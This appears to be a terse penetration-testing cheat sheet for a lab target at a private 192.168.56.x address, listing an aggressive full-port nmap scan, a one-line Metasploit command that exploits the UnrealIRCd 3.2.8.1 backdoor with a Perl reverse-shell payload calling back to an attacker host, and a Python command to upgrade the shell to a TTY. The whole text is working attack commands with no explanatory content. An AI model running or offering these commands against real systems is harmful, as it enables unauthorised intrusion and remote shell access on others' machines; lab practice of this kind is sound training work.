## NMAP
```
nmap -T4 -sS -A -Pn -p- 192.168.56.103
```
## BackDoor
```
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.103; set LHOST 192.168.56.102; set payload cmd/unix/reverse_perl; run"
```
## TTY
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

